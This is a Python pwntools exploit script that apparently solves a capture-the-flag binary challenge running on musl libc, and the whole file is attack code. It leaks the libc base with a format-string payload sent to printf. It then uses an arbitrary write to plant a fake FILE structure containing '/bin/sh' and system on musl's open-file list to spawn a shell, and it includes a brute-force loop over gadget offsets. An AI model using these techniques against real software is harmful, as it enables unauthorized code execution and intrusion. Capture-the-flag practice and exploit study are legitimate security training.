#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
lib = './ld-musl-x86_64.so.1'
lib = ELF(lib, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '20.195.43.216', 8002

USING_LIB_DEBUG = True
def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)
    
env = {
    "LD_PRELOAD": "ld-musl-x86_64.so.1"
}

gdbscript = '''
init-pwndbg

# gift's printf
break *0x40126e

# scanf that writes
# break *0x40110f

# call to exit in main
break *0x401116
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

# maybe through stdin's f->seek() function ptr
def fuzz_one_gadget():
    global io

    for i in range(0, 142):
        try:
            context.log_level = 'warning'
            # log.warn(f'trying system offset-{i}') # 529
            log.warn(f'trying execvpe offset-{i}') # 142

            io = initialize()

            io.sendline(b'%p|%d|%p|%p|%p|%p%p%p|%s' + p64(elf.got['printf']))
            io.recvuntil(b'70|')

            if not USING_LIB_DEBUG:
                lib.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x621b1
                stdout = lib.address + 0xa2280
                stdin = lib.address + 0xa2180
                stderr = lib.address + 0xa8080
            else:
                lib.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x729c0
                stdout = lib.address + 0xb7280
                stdin = lib.address + 0xb7180
                stderr = lib.address + 0xb7080

            io.sendlineafter(b'Where:', hex(stdin+0x50).encode())
            # io.sendlineafter(b'What:', hex(lib.address + 0x6a440 + i).encode())
            io.sendlineafter(b'What:', hex(lib.address + 0x695a0 + i).encode())

            io.send(b'ls')
            io.recvline()

            log.info("lib base: %#x", lib.address)
            log.info("stdout: %#x", stdout)
            log.info("stdin: %#x", stdin)
            log.info("stderr: %#x", stderr)
            io.interactive()
        except Exception as e:
            io.close()
            continue
    
def exploit():
    io = initialize()

    # why musl no position format string
    io.sendline(b'%p|%d|%p|%p|%p|%p%p%p|%s' + p64(elf.got['printf']))
    io.recvuntil(b'70|')

    if not USING_LIB_DEBUG:
        lib.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x621b1
        stdout = lib.address + 0xa2280
        stdin = lib.address + 0xa2180
        stderr = lib.address + 0xa8080
        ofl_head = lib.address + 0xa4e88
        buf = lib.address + 0xa32e9+7
    else:
        lib.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x729c0
        stdout = lib.address + 0xb7280
        stdin = lib.address + 0xb7180
        stderr = lib.address + 0xb7080
        ofl_head = lib.address + 0xb9e88
        buf = lib.address + 0xb82f0

    fake_file = flat([
        u64(b'/bin/sh\x00'),
        0x1,
        0x2,
        0x3,
        0x4,
        0x5,
        0x6,
        0x7,
        0x8,
        lib.sym['system']
    ])

    payload = hex(buf+6).encode() + fake_file
    io.sendlineafter(b'Where:', hex(ofl_head).encode())
    io.sendlineafter(b'What:', payload)

    log.info("lib base: %#x", lib.address)
    log.info("stdout: %#x", stdout)
    log.info("stdin: %#x", stdin)
    log.info("stderr: %#x", stderr)
    io.interactive()

if __name__ == '__main__':
    # fuzz_one_gadget()
    exploit()
